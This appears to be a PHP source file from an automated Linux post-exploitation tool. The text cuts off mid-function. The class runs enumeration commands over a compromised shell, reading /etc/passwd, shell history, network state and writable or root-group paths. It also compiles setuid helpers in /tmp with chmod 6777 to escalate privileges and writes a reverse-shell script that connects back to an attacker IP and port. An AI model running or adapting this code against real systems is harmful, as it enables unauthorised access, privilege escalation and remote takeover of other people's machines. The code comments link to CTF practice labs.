<?php

class lan4linux extends LAN{
    var $lan2where ;
    var $templateB64_id ;
    var $template_id ;
    var $templateB64_cmd ;
    var $template_cmd ;
    var $template_shell ;
    var $templateB64_shell ;
    
    var $uid ;
    var $uid_name;
    var $gid;
    var $gid_name;
    var $context;
    
    var $tab_users_etc_passwd ;
    var $tab_users_shell ;
    var $tab_users_gid_root;
    
    var $etc_passwd_str ;
    var $env_path_str ;
    var $shell_version ;
    var $wget_path ;
    
    
    
    
    /*
     https://hackingresources.com/category/ctf-writeups/vulnhub-writeups/
     https://hackso.me/
     https://emaragkos.gr/recommended-machines/
     http://overthewire.org/wargames/
     https://www.hackingarticles.in/ctf-challenges-walkthrough/
     https://pentest.training/virtualmachines.php
     http://captf.com/practice-ctf/
     https://practicalpentestlabs.com/
     https://www.virtualhackinglabs.com/     
     vulnhub writeups
     
     https://github.com/initstring/uptux
     */

    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context) {
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream);

        $this->uid = trim($uid);
        $this->uid_name = trim($uid_name);
        $this->gid = trim($gid);
        $this->gid_name = trim($gid_name);
        $this->templateB64_id = trim($templateB64_id);
        $this->template_id = base64_decode($this->templateB64_id);
        $this->templateB64_cmd = trim($templateB64_cmd);
        $this->template_cmd = base64_decode($this->templateB64_cmd);
        $this->templateB64_shell = trim($templateB64_shell);
        $this->template_shell = base64_decode($this->templateB64_shell);
        $this->context = trim($context);
        
      
        $this->lan2where = "id8port = '$this->port2id' AND uid_name = '$this->uid_name' AND templateB64_id = '$this->templateB64_id' AND templateB64_cmd = '$this->templateB64_cmd' AND uid = '$uid' AND gid = '$gid' AND gid_name = '$gid_name' AND context = '$context' ";
        
        
        if (empty($this->uid_name)) {$this->log2error("Empty USERNAME",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","LAN");exit();}
        
        if ($this->context !== "listening_Server" ){
            $sql_r = "SELECT templateB64_id FROM LAN WHERE $this->lan2where ORDER BY ladate DESC LIMIT 1 ";           
        if (!$this->checkBD($sql_r)) {
            $sql_w = "INSERT INTO LAN (id8port,uid_name,templateB64_id,templateB64_cmd,templateB64_shell,uid,gid,gid_name,context) VALUES ('$this->port2id','$this->uid_name','$this->templateB64_id','$this->templateB64_cmd','$this->templateB64_shell','$this->uid','$this->gid','$this->gid_name','$this->context'); ";
            echo "$sql_w\n";
            $this->mysql_ressource->query($sql_w);
            //$this->cmd("localhost","echo '$this->root_passwd' | sudo -S tshark -i $this->eth_wlan  host $this->ip -w $this->dir_tmp/$this->ip.pcap");
            echo $this->rouge("Working on LAN for the first time");
            
        }
        }
         

    }
    

    
    
    public function lan2env4path(){
        $data = "cat /etc/environment";
        $this->lan2stream4result($data,$this->stream_timeout);       
        $data = "systemctl show-environment";
        $this->lan2stream4result($data,$this->stream_timeout);
        $data = "echo \$PATH ";
        return $this->lan2stream4result($data,$this->stream_timeout);
    }
    
    public function lan2start(){

        $this->titre(__FUNCTION__);
 
        $data = "id ";
        $this->lan2stream4result($data,$this->stream_timeout);

        $data = "/usr/bin/id ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $data = "echo \$LOGNAME ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("logged on");        
        $data = "who 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "w 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);

        
        $this->note("Users that have previously logged onto the system");
        $data = "lastlog 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "last 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("What has the user being doing? Is there any password in plain text? What have they been edting?");
        $data = "history";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "date";
        $this->lan2stream4result($data, $this->stream_timeout);
        
        $data = "uname -a";
        $this->lan2stream4result($data, $this->stream_timeout);
        

        
        $data = "echo \$PWD ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "echo \$HOME ";
        $this->lan2stream4result($data,$this->stream_timeout);

        
        $data = "echo \$SESSION";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "echo \$TERM";
        $this->lan2stream4result($data,$this->stream_timeout);
              
        $data = "echo \$SHELL ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "echo $0";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "echo \$BASH_VERSION";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "\$SHELL --version";
        $this->lan2stream4result($data,$this->stream_timeout);
        

        
        $data = "cat /etc/passwd ";
        $strings_etc_passwd = $this->lan2stream4result($data,$this->stream_timeout*2);
                
        $this->parse4etc_passwd($strings_etc_passwd);
        
        $this->users2gid_root();
        
        $data = "uname -r";
        $os_kernel = trim($this->lan2stream4result($data,$this->stream_timeout*2));
                
        $data = "uname -s";
        $os_plateforme = trim($this->lan2stream4result($data,$this->stream_timeout*2));
                
        $this->os_kernel_number = trim($this->req_ret_str("echo \"$os_kernel\" | grep -Po \"[2-4]{1}\.[0-9]{1,2}\.[0-9]{1,3}\-[[:print:]]{1,}\" "));
        $this->os_plateforme_name = trim($this->req_ret_str("echo \"$os_plateforme\" | grep -i -E \"(linux|windows|debian|unix)\" "));
        $this->ip2os4arch($this->os_plateforme_name);
        $this->parse4kernel($this->os_kernel_number);
        
        
        
        $data = "echo \$JOB ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "echo \$DISPLAY ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("What development tools/languages are installed/supported?");
        $data = "which perl php python ruby gcc cc clang java go gdb find";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("How can files be uploaded?");
        $data = "which wget curl elinks w3m lynx fetch lwp-download nc netcat nmap ncat ftp tftp ssh socat tcpdump elinks tcpbind telnet";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        $this->note("checks to see if roots home directory is accessible");
        $data = "ls -ahl /root/ 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("Accounts that have recently used sudo");
        $data = "find /home -name .sudo_as_admin_successful 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $data = "groups";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "grep -E '^UID_MIN|^UID_MAX' /etc/login.defs";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->ssTitre("World-readable files within /home");
        $data = "find /home/ -perm -4 -type f -exec ls -al {} \; 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("Noowner files");
        $data = "find / -xdev \( -nouser -o -nogroup \) -print 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout*3);
        
        $data = "find / -writable -type d 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout*3);
        
        $data = "find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout*3);
        
        
        $data = "grep -v -e '^$' /etc/hosts /etc/resolv.conf  | grep -v '^#' | sort -u 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "dnsdomainname";
        $this->lan2stream4result($data,$this->stream_timeout);
        

        
        $this->note("Provides a list of active connections.
Can be used to determine what ports are listening on the server");
        $data = "cat /proc/net/tcp";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat /proc/net/udp";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("This is used for route caching.
This can also be used to determine local IPs, as well as gain a better understanding of the target's networking structure");
        $data = "cat /proc/net/fib_trie";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("listening TCP");
        $data = "netstat -antp 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ss -t 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("listening UDP");
        $data = "netstat -anup 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ss -u 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "find / -executable -user $this->uid_name ! -group $this->uid_name -type f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \; 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout*3); 
        
    }
    
    public function lan2whoami(){
        $username_found = "";
        $rst = $this->lan2id();
        list($uid_found,$username_found,$gid_found,$groupname_found) = $this->parse4id($rst);
        return $username_found;
    }
    
    public function lan2id(){
        $data = "id";
        return $this->lan2stream4result($data,$this->stream_timeout);
        
    }
    
    public function lan2ip4wan(){
        $data = "wget http://ipecho.net/plain -O - -q ; echo";
        return trim($this->lan2stream4result($data,$this->stream_timeout));
    }



    public function lan2search4app4exist($app){
        $this->titre(__FUNCTION__);
        $app = trim($app);
        $data =  "which $app";
        $app_path = trim($this->lan2stream4result($data,$this->stream_timeout));
        if(stristr($app_path, "/$app")) return $app;
        else return FALSE;
    }
 
   
    public function users2gid_root(){
        
        
        $this->ssTitre("List of groups root ");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i | grep 'gid=0(root)' ;done 2>/dev/null";
        $users_all_rst = $this->lan2stream4result($data,$this->stream_timeout);
        $results = array();
        
        $users_tmp = explode("\n",$users_all_rst);
        foreach ($users_tmp as $line ){
            $this->article("line", $line);
            if (preg_match('/uid=(?<uid>[0-9]{1,5})\((?<username>[0-9a-zA-Z_\-]{1,})\) gid=0\(root\)/',$line,$results))  {
                if(!empty($results)){
                    $this->tab_users_gid_root[] = $results['username'] ;
                }
                
            }
            unset($results);
        }
        
        
        echo $this->tab($this->tab_users_gid_root);
        
        $this->ssTitre("Group memberships");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->ssTitre("look for adm group");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done | grep \"(adm)\" 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
 
        $this->ssTitre("look for lxd group");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done | grep \"(lxd)\" 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->ssTitre("look for docker group");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done | grep \"(docker)\" 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->ssTitre("List of users with no password");
        $data = "cat /etc/passwd | awk -F: '($2 != \"x\") {print}' ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->ssTitre("all root accounts (uid 0)");
        $data = "grep -v -E \"^#\" /etc/passwd 2>/dev/null | awk -F: '$3 == 0 { print $1}' 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
    }
    
    public function lan2pentest8id($template_id_euid,$attacker_ip,$attacker_port,$shell){
        // echo id | sshpass -p 'password' ssh user@10.60.10.131 -p 22 -C  "/tmp/seteuid_user_user2_bash \"/tmp/seteuid_user2_user3_bash \\\"/tmp/seteuid_user3_root_bash \"/bin/bash\" \\\" \" "
        
        $this->titre(__FUNCTION__);
        if ($this->ip2root8db($this->ip2id)) return $this->log2succes("IP already rooted",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
        if (!strstr($template_id_euid, "%ID%")) return $this->log2error("There is NO %ID% into Template:$template_id_euid",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
        $template_id = $template_id_euid;
        $templateB64_id = trim(base64_encode($template_id));
        $euid = "";
        $euid_name = "";
        $egid = "";
        $egid_name = "";
        $groups = "";
        
        $id = "id";
        $cmd_id = str_replace("%ID%", $id, $template_id);
        //$rst_id = $this->stream4result($this->stream,$cmd_id,$this->stream_timeout*3);

        $rst_id = $this->lan2stream4result($cmd_id,$this->stream_timeout*3);
        //var_dump($rst_id);
        
        while (strstr($rst_id, "s password:")!==FALSE){
            $chaine = "Asking Password";
            $this->rouge($chaine);
            $data = "\n";
            $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
        }
        
        list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context) = $this->parse4id($rst_id);
        
        
        if (!empty($uid_name) ){
            
            if ( (empty($euid_name)) && ($uid_name !== $this->uid_name) ){
                $this->article("Old UID NAME", $this->uid_name);
                $this->log2succes("check new USER:$uid_name",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");$this->pause();
                $template_cmd2 = str_replace("%SHELL%",addcslashes($template_id,'"'),$this->template_shell);
                $template_cmd = str_replace("%ID%","%CMD%",$template_cmd2);
                $templateB64_cmd = base64_encode($template_cmd);
                
                //$data = str_replace("%ID%", $shell, $template_id);
                //fputs($this->stream, $data);
                //$template_id = "%ID%";
                
                $templateB64_id = base64_encode($template_id);
                $this->article("CREATE Template ID", $template_id);
                //$this->article("CREATE Template BASE64 ID", $templateB64_id);
                $this->article("CREATE Template CMD", $template_cmd);
                //$this->article("CREATE Template BASE64 CMD",$templateB64_cmd);
                //fgets(STDIN);
                $this->pause();
                
                $obj_lan_root1 = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_cmd,$this->templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context);
                $obj_lan_root1->poc($this->flag_poc);
                $obj_lan_root1->lan2check8id($attacker_ip,$attacker_port,$shell);$this->pause();
                
            }
            if (!empty($euid_name)){
                $this->rouge("try to spawn $euid_name ");$this->pause();
                
                $template_id_new = $this->lan2spawn2shell8euid($template_id);$this->pause();
                
                $cmd_id = str_replace("%ID%", $id, $template_id_new);
                $rst_id = $this->lan2stream4result($cmd_id,$this->stream_timeout);
                list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context) = $this->parse4id($rst_id);
               
                
                $template_id = $template_id_new;
                $templateB64_id = base64_encode($template_id);
                
                
                $template_cmd2 = str_replace("%SHELL%",$template_id,$this->template_shell);
                $template_cmd = str_replace("%ID%","%CMD%",$template_cmd2);
                
                
                $templateB64_cmd = base64_encode($template_cmd);
                
                $this->article("OLD Template ID", $this->template_id);
                //$this->article("NEW Template ID", $template_id);
                $this->article("OLD Template CMD", $this->template_cmd);
                //$this->article("NEW Template CMD", $template_cmd);
                $obj_lan_root = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_cmd,$this->templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context);
                $obj_lan_root->poc($this->flag_poc);
                $this->article("Template ID", $obj_lan_root->template_id);
                //$this->article("Template BASE64 ID", $obj_lan_root->templateB64_id);
                $this->article("Template CMD", $obj_lan_root->template_cmd);
                //$this->article("Template BASE64 CMD",$obj_lan_root->templateB64_cmd);
                $this->pause();

            if ($this->uid_name !== $obj_lan_root->uid_name){   
                
                $chaine = "spawning $obj_lan_root->uid_name";
                $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
                

                $this->pause();
                //stream_copy_to_stream($this->stream, $stream);

                $cmd_id = str_replace("%ID%", $id, $obj_lan_root->template_id);$this->pause();

                
                if ($this->lan2root4check8id($cmd_id,$obj_lan_root->templateB64_id)) {
                    $this->log2succes("Yes RooT running infos",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
                    
                    $obj_lan_root->lan2check8id($attacker_ip,$attacker_port,$shell);$this->pause();

                }
                else {
                    
                    $this->log2succes("$obj_lan_root->uid_name is not root checking again",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
                    $obj_lan_root->lan2check8id($attacker_ip,$attacker_port,$shell);$this->pause();
                    /*
                    $attacker_ip = $this->ip4addr4target($this->ip);
                    $attacker_port = rand(1024,65535);                    
                    $shell = "/bin/bash";
                    $nc = $this->rev8sh($attacker_ip, $attacker_port, $shell);
                    $cmd_nc = str_replace("%ID%", $nc, $template_id);
                    */
                    
                    //$obj_lan_root->lan4root();
                    
                    //$obj_lan_root->lan2pentest($attacker_port, $templateB64_id, $cmd_nc, $this->stream_timeout*1000);$this->pause();
                }
                
            }
        }
        }
        $this->rouge("out from ".__FUNCTION__);$this->pause();
    }
    

    
    public function lan2stream4result($data,$timeout){
        $data= trim($data);
        $this->article("Template", $this->template_id);
        $cmd = str_replace("%ID%", $data, $this->template_id);
        $cmd_exec = base64_encode($cmd); 
        //$cmd = "echo '$cmd_exec' | base64 -d | bash -  ";
        return $this->stream4result($this->stream, $cmd, $timeout);
    }
    
    
    public function lan2spawn2shell8euid($template_id){
        $this->ssTitre(__FUNCTION__);
        $result = "";
        $cmd_id = str_replace("%ID%", "id", $template_id);
        
        
        $data = "$cmd_id";
        $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
        $hashname = sha1("$this->templateB64_id");
        if (strstr($rst_id, "euid=")) {
            
            $seteuid = <<<EOC
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void){
setuid(0);
setgid(0);
system("/bin/bash -c id");
return 0;
}
EOC;
            
            $seteuid = <<<EOC
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void){
setreuid(geteuid(),getuid());
setregid(getegid(),getgid());
system("/bin/bash -c id");
return 0;
}
EOC;
          
            

            $query = "echo '$seteuid' > /tmp/seteuid_id_$this->uid_name.c";
            $this->lan2stream4result($query,$this->stream_timeout);
            $query = "gcc -o /tmp/seteuid_id_$this->uid_name /tmp/seteuid_id_$this->uid_name.c && chmod 6777 /tmp/seteuid_id_$this->uid_name ";
            $data = str_replace("%ID%","\"$query\"", $template_id);
            $this->lan2stream4result($data,$this->stream_timeout);
            $data = str_replace("%ID%", "/tmp/seteuid_id_$this->uid_name", $template_id);
            $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
             
            list($uid_found,$username_found,$gid_found,$groupname_found,$euid,$username_euid,$egid,$groupname_egid,$groups) = $this->parse4id($rst_id);
           
            
            if ( !empty($username_found) ){
                
                $chaine = "Try to Spawn USER:$username_found via USER:$this->uid_name";
                $this->note($chaine);
                $this->article("username found", $username_found);
 
                $this->article("username now", $this->uid_name);
                
                
                if ($this->uid_name !== $username_found){
                    $chaine = "yes USER:$username_found spawned via USER:$this->uid_name";
                    $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");

                    
                    $seteuid = <<<EOC
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(int argc, char **argv){
setreuid(geteuid(),getuid());
setregid(getegid(),getgid());
printf("Argv %s\\n",argv[1]);
execl("/bin/bash","bash","-c",argv[1], NULL);
return 0;
}
EOC;
                   // execl("/bin/sh","sh","-c","$cmd_nc", NULL);
                    // execve("/bin/bash",["/bin/bash", NULL], NULL);
                    // system("cp /bin/bash /tmp/bash_$this->uid_name && chmod 6777 /tmp/bash_$this->uid_name");
                    $file_bash_name = "/tmp/shell_$username_found";
                    $tmp = "echo '$seteuid' > $file_bash_name.c ";
                    //$data = str_replace("%ID%", $tmp, $template_id);
                    $this->lan2stream4result($tmp,$this->stream_timeout);
                    $query = "gcc -o $file_bash_name $file_bash_name.c && chmod 6777 $file_bash_name";
                    $data = str_replace("%ID%","\"$query\"", $template_id);
                    $this->lan2stream4result($data,$this->stream_timeout);
                    $data = "ls -al /tmp/";
                    $this->lan2stream4result($data,$this->stream_timeout);
                    $data = "ls -al $file_bash_name";
                    $this->lan2stream4result($data,$this->stream_timeout);
                    $this->pause();

                    
                    $data = "$file_bash_name id";
                    $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
                    list($new_uid_found,$new_username_found,$new_gid_found,$new_groupname_found,$new_euid,$new_username_euid,$new_egid,$new_groupname_egid,$new_groups) = $this->parse4id($rst_id);
                    
                    
                    if ( !empty($new_username_found) ){
                        if ( $new_username_found===$username_found ){
                            $chaine = "Succes Spawn $username_found";
                            $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
                            
                            $new_templateB64_id = "$file_bash_name %ID%";
                            $this->article("New TEMPLATE B64", $new_templateB64_id);
                            $this->pause();
                            return $new_templateB64_id;
                        }
                    }
                    
                    

                    

                    
                    /*
                    
                                        $shell = "/bin/sh";
                    $attacker_ip = $this->ip4addr4target($this->ip);
                    $attacker_port = rand(1024,65535);
                    $attacker_port = 7777;
                    $shell = "/bin/bash";
                    $cmd = $this->rev8sh($attacker_ip, $attacker_port, $shell);
                    
                    $seteuid = <<<EOC
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void){
setreuid(geteuid(),getuid());
setregid(getegid(),getgid());
system(\\\"/bin/bash -c \'$cmd\' \\\");
return 0;
}
EOC;
                    $tmp = "echo \"$seteuid\" > /tmp/seteuid_rev_$this->uid_name.c && gcc -o /tmp/seteuid_rev_$this->uid_name /tmp/seteuid_rev_$this->uid_name.c && chmod 6755 /tmp/seteuid_rev_$this->uid_name && chmod +s /tmp/seteuid_rev_$this->uid_name";
                    $this->lan2stream4result($tmp,$this->stream_timeout);
                    //$data = str_replace("%ID%", $tmp, $template_id);

                    
                    
                    
                    $data = "ls -al /tmp/seteuid_rev_$this->uid_name";
                    $this->lan2stream4result($data,$this->stream_timeout);
                    $data = str_replace("%ID%", "/tmp/seteuid_rev_$this->uid_name", $template_id); 
                    //$this->lan2stream4result($data,$this->stream_timeout);
                    //$template_cmd = str_replace("%ID%", "%CMD%", $template_id);
                    //$infos_base64 = base64_encode($template_cmd);
                    //$time2wait = $this->stream_timeout*20;
                    //$this->lan2pentest($attacker_port, $infos_base64, $data, $time2wait);
              */
                    
                    

                    
                    //$this->lan2pentest8id($template_id_euid,$attacker_ip,$attacker_port,$shell);
                    
                }
                else {
                    $chaine = "NOT spawned USER:$this->uid_name to USER:$username_found ";
                    $this->rouge($chaine);$this->pause();
                    
                }
            }

        }
        
            
        return $template_id ;
    }
  

    public function lan2file4exist($filename){
        $this->ssTitre(__FUNCTION__);
        $filepath = $this->lan2file4locate($filename);
        if (!empty($filepath)){
            return TRUE;
        }
        ELSE return FALSE;
    }
    
    
    public function lan2file4locate($filename){
        $this->ssTitre(__FUNCTION__);
        $files_found = "";
        $tmp2 = array();
        $data = "locate $filename ";
        $tmp = trim($this->lan2stream4result($data,$this->stream_timeout));
        exec("echo '$tmp' $this->filter_file_path ",$tmp2);
        if (!empty($tmp2)) if (isset($tmp2[0])) $files_found = $tmp2[0];
        
        if( (!empty($files_found)) && (stristr($files_found, $filename)) ){
            return $files_found ;
        }
        
        $data = "find / -iname $filename -type f -exec ls {} \;";
        $tmp = trim($this->lan2stream4result($data,$this->stream_timeout));
        exec("echo '$tmp' $this->filter_file_path ",$tmp2);
        if (!empty($tmp2)) if (isset($tmp2[0])) $files_found = $tmp2[0];
        
        if( (!empty($files_found)) && (stristr($files_found, $filename)) ){
            return $files_found ;
        }
        
    }
    
    
    
    public function lan2file4search($filename,$search_data){
        $this->ssTitre(__FUNCTION__);
        $search_data = trim($search_data);
        $obj_filename = new FILE($filename);
        if($this->lan2file4writable($obj_filename->file_path)){
            $data = "cat $obj_filename->file_path";
            $lines = $this->lan2stream4result($data,$this->stream_timeout);
            $lines_tab = explode("\n", $lines);
            $this->article("Searching", $search_data);
            foreach ($lines_tab as $line){
                if (strstr($line, $search_data)!==FALSE)
                {
                    $this->article("Searching", "Found ");
                    return TRUE ;
                }
                
            }
        }
        $this->article("Searching", "Not Found");
        return FALSE;
    }
    
    
    public function lan2file4add($filename,$add_data){
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        $obj_filename = new FILE($filename);
        
        if ($this->lan2file4search($obj_filename->file_path, $add_data)){
            $result .=  $this->note("Already Added: $add_data");
        }
        else {
            $result .=  $this->note("ADD: $add_data");
            $result .=  $this->lan2stream4result("echo '$add_data' >> $obj_filename->file_path");
        }
        $data = "grep '$add_data' $obj_filename->file_path | grep -Po '$add_data' ";
        $this->lan2stream4result($data,$this->stream_timeout);
        return $result;
    }
    
    
    public function lan2file4writable($filename){
        $this->ssTitre(__FUNCTION__);
        $data = "stat $filename";
        $writable_test = trim($this->lan2stream4result($data,$this->stream_timeout));
        if (preg_match('/[0-7]{3}(?<user2write>[0-7]{1})\/[rwx\-]{7}/',$writable_test,$writable_rst))
        {
            if (isset($writable_rst['user2write'])){
                $this->article("User Permission",$writable_rst['user2write']);
                if ($writable_rst['user2write']>6) {
                    $this->rouge("Writeable $filename");
                    return TRUE;}
                    else {$this->note("Not Writeable less 6 $filename");return FALSE;}
            }
        }
        else {$this->note("Not Writeable $filename");return FALSE;}
    }
    
    public function lan2file4readable($filename){
        $this->ssTitre(__FUNCTION__);
        $data = "stat $filename";
        $readable_test = trim($this->lan2stream4result($data,$this->stream_timeout));
        if (preg_match('/[0-7]{3}(?<user2read>[0-7]{1})\/[rwx\-]{7}/',$readable_test,$readable_rst))
        {
            if (isset($readable_rst['user2read'])){
                $this->article("readable",$readable_rst['user2read']);
                if ($readable_rst['user2read']>4) {
                    $this->note("readable $filename");
                    return TRUE;}
                    
            }
        }
        else {$this->note("Not readable $filename");return FALSE;}
    }
    
    
    
    public function lan2file4replace($filename,$search_data,$replace_data){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $obj_filename = new FILE($filename);
        
        if ($this->lan2file4search($obj_filename->file_path,$search_data)){
            $data = "cat $obj_filename->file_path";
            $lines = $this->lan2stream4result($data,$this->stream_timeout);
            $lines_tab = explode("\n", $lines);
            
            foreach ($lines_tab as $line){
                if (preg_match('#['.$search_data.']#',$line))
                {
                    $this->article("Searching", "Found ");
                    $result .= str_replace($search_data, $replace_data, $line);
                }
                else {
                    $result .= $line;
                }
            }
            
            $this->article("Replacing", "Data ");
            $data = "echo '$result' > $obj_filename->file_path";
            $this->lan2stream4result($data,$this->stream_timeout);
            
        }
        else {
            $this->note("Data Not found: $search_data");
        }
        
        
        
        
        
        
        return $result;
    }
    


public function lan2root4check8id($data,$infos_base64){
    $this->ssTitre(__FUNCTION__);
    $data = trim($data);

    $impass = "must be run from a terminal";
    if (empty($data)){
        $this->log2error("Empty DATA",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");       
        return FALSE;
    }
    $check = $this->lan2stream4result($data,$this->stream_timeout*2.5);
    //var_dump($check);
    if (stristr($check,$impass)){
        //$this->notify("$this->ip:$this->port:$this->protocol:$impass:$data:$infos");
        $this->log2error($impass,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
        
        return FALSE;
    }
    if(strstr($check, "uid=0(root)")){
        $this->port2root($infos_base64);
        return TRUE;
    }
    else {
        $this->note("Not Rooted");
        return FALSE;
    }
    
}





public function lan2check8id($attacker_ip, $attacker_port, $shell){
    $this->ssTitre(__FUNCTION__);
    
    $query = str_replace("%CMD%", "id", $this->template_cmd);
    $this->requette($query);
    $this->pause();
    

    $cmd_nc = $this->rev8sh($attacker_ip, $attacker_port, $shell);
    //$cmd_nc = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
    //s$cmd_nc = $this->rev8exec($attacker_ip, $attacker_port, $shell);
    //$cmd_nc = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
    //$cmd_nc = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
    //$cmd_nc = $this->rev8perl($attacker_ip, $attacker_port, $shell);
    //$cmd_nc = $this->rev8node($attacker_ip, $attacker_port, $shell);
    //$cmd_nc = $this->rev8php($attacker_ip, $attacker_port, $shell)
    $cmd_nc = addcslashes($cmd_nc,'"');
    //$cmd_nc = addcslashes($cmd_nc,'$');
    //$cmd_nc = $this->rev8python3($attacker_ip, $attacker_port, $shell);
    $lprotocol = "T";
    //$cmd_remote = str_replace("%ID%", $cmd_nc, $this->template_id);
    //$cmd1 = str_replace("%CMD%",$cmd_nc,$this->template_cmd);
    $this->article("TEMPLATE ID",$this->template_id);
    $hash_cmd_rev = sha1($cmd_nc);
    //$data = "echo \"$cmd_nc\" > /tmp/$hash_cmd_rev.sh";
    $data = "echo \"#!/bin/bash\n$cmd_nc\" > /tmp/$hash_cmd_rev.sh ; chmod 6777 /tmp/$hash_cmd_rev.sh";
    $this->requette($data);$this->pause();
    $this->stream4result($this->stream,$data, $this->stream_timeout);

    $data = "ls -al /tmp/$hash_cmd_rev.sh";
    $this->stream4result($this->stream,$data, $this->stream_timeout);
    $data = "cat /tmp/$hash_cmd_rev.sh";
    $this->stream4result($this->stream,$data, $this->stream_timeout);
    $cmd2 = str_replace("%CMD%","/tmp/$hash_cmd_rev.sh",$this->template_cmd);
    $this->article("TEMPLATE CMD", $this->template_cmd);
    
 
 
    
    $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $attacker_port $lprotocol $this->templateB64_cmd $this->templateB64_shell server 60 listening_Server\" ";
    $cmd2 = str_replace("%ID%","/tmp/$hash_cmd_rev.sh",$this->template_id);
    
    $query1 = "xterm -T '$cmd1' -e '$cmd1' 2> /dev/null ";

    
    $pid = pcntl_fork ();
    if ($pid) {
        echo "\t\033[36;40;1;1m 1:\033[0m \033[37;40;1;1m $query1 \033[0m\n";
        system ( $query1 );
    } else {
        sleep ( 5 );
